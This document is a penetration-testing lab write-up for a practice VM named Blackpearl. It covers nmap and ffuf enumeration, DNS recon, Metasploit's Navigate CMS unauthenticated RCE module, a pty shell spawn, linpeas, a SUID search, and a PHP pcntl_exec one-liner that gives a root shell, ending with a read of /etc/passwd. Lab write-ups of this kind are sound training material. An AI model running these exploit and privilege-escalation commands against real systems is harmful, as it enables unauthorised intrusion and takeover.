# Target Details

| IP            | Hostname/Box | Operating System /Platform |
| ------------- | ------------ | -------------------------- |
| 192.168.1.110 | Blackpearl       | Linux 4.15 - 5.6      |

# Box Outline
Nmap scans revealed ports 22, 53 and 80 as open. Port 80 lead to the default page of an nginx server. When viewing the page source, there was information disclosure "<!-- Webmaster: alek@blackpearl.tcm -->" that eluded to a user named "alek" with a domain named "blackpearl.tcm". I performed directory discovery, and found a useful path: 'view-source:http://192.168.1.110/secret'. This revealed a note that stated directory discovery was not the route to go for this machine. I then researched port 53 by doing a dns recon. This revealed one record: blackpearl.tcm. I added this domain name and tied it to the ip address of the machine '192.168.1.110' by adding it to my /etc/hosts file. I navigated to blackpearl.tcm and came across a default php page. Now that I know blackpearl.tcm is valid, I ran another directory discovery and it revealed the following path: blackpearl.tcm/navigate/login.php (Navigate CMS portal). I began researching for vulnerabilities for this CMS. I found the following "Navigate CMS Unauthenticated Remote Code Execution" via Rapid7 and ran it successfully to gain low level privileges. I then downloaded linpeas on the target system in order to reveal any additional vulnerabilities. There was an indicator that I might be able to exploit "Unknown SUID binaries". Once I discovered specific folders that maybe executed with owner permissions when the SUID bit was set, I conducted online research and found a script that allowed me to exploit the php folder and gained root privileges. Once I had root access, I read the contents of the flag.txt, and cat /etc/passwd.

# Scanning and Enumeration
Ran nmap scan
```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -T4 -p- -A 192.168.1.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 21:10 EDT
Nmap scan report for 192.168.1.110
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66381450ae7dab3972bf419c39251a0f (RSA)
|   256 a62e7771c6496fd573e9227d8b1ca9c6 (ECDSA)
|_  256 890b73c153c8e1885ec316ded1e5260d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:52:06:39 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.09 ms 192.168.1.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.11 seconds
```
Port 80
I found the default page to an nginx server
![](default%20nginx%20server%20page.png)
Viewing the page source, I found a commented out note "<!-- Webmaster: alek@blackpearl.tcm -->"
![](page%20source%20for%20nginx%20-%20information%20disclosure.png)

Directory Busting
```bash
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.1.110/FUZZ 
```

ffuf-ing led to a /secret. Navigating to the path, the following screenshot was taken.

![](secret%20directory%20path.png)

Port 22
	Maybe bruteforce alek@192.168.1.110?

Port 53
Exploring port 53, we did a dns recon
![](dns%20recon%20blackpearl.tcm.png)
This indicated there is a dns record pointing to blackpearl.tcm. In order for me to get to that location, I needed to add the IP address to my /etc/hosts file
![](adding%20blackpearl.tcm%20to%20etc-hosts.png)
So when I navigate to blackpearl.tcm, I get a live link to a default PHP page
![](php%20page%20for%20blackpearl.tcm.png)
Now that I have some additional information, I ran another ffuf. This time on the address http://blackpearl.tcm
```bash
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ

```
This scan revealed the path "/navigate"
![](navigate%20csm%20home%20page.png)
**Background information**
	

# Exploitation
After googling, I found two resources that indicated this 'Navigate CMS' can be exploited.
	1. https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
	2. https://www.exploit-db.com/exploits/45561

### Vulnerability
#### Navigate CMS Unauthenticated Remote Code Execution (Rapid7)

| Disclosed | Created |
| --------- | ---------- |
|  09/26/2018         |      03/19/2019      |
#### Description
This module exploits insufficient sanitization in the database::protect method, of Navigate CMS versions 2.8 and prior, to bypass authentication. The module then uses a path traversal vulnerability in navigate_upload.php that allows authenticated users to upload PHP files to arbitrary locations. Together these vulnerabilities allow an unauthenticated attacker to execute arbitrary PHP code remotely. This module was tested against Navigate CMS 2.8.

`msf > use exploit/multi/http/navigate_cms_rce`

![](options%20for%20navigate%20rce%20exploit.png)
Successful exploit led to a meterpreter shell as www-data user
![](shell%20from%20navigate%20rce%20exploit.png)
#tip type shell to drop into a shell
#tip if there is no designator, then I need to spawn a tty shell
In order to do this with the following resource (https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell) we need to determine if python is installed on the machine using `which python`. Once that was determined, the following code was ran. Doing this allowed us a clearer interface with details such as who we were logged in as, and where.
`python -c 'import pty; pty.spawn("/bin/bash")'``

![](python%20execution%20dropping%20into%20shell.png)
# Privilege Escalation
Now that we have access to the system with low level permissions, we need to determine how we can escalate privileges. I downloaded linpeas onto the target machine, and ran it.
![](linpeas%20file%20transfer.png)
#tip Remember to update the linpeas.sh on the target machine to make it an executable
```bash
www-data@blackpearl:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@blackpearl:/tmp$ ./linpeas.sh
```
Once we run linpeas, we find the following key pieces of information

CVE-2021-3560
![](CVE-2021-3560.png)
Back up files can potentially have config files, passwords, useful databases, etc
![](backup%20folders%20of%20interest.png)

![](passwd%20files%20of%20interest.png)

![](users%20on%20blackpearl.png)
Look for "Unknown SUID binaries" in the linpeas report. Looking for SUID, SGID, and the Stickybit. We're looking for binaries, that we (as a low level user) can run as the owner of the binary (root).
`-rwsr-xr--` SUID - Low level user can run as owner
`-rwxr-sr-x` SGID - Low level user can run as group owner

In this box, there is a command that provides a clearer picture for us. Essentially showing us permission settings for the binaries
`find / -type f -perm -4000 2>/dev/null`
![](folders%20with%20SUID%20permissions.png)

Once we've identified the files, we do some online research in gtfobins, filtering on PHP. We chose the SUID exploit. 
(https://gtfobins.github.io/#+suid)
![](PHP%20SUID%20exploit.png)
Noting the php folder/version, we executed the command
`/usr/bin/php7.3 -r "pcntl_exec('bin/sh', ['-p']);"`
And with this command we gained root access
![](getting%20root.png)

Completed, but maybe try an automated way?

# Post Exploitation
cat /etc/passwd
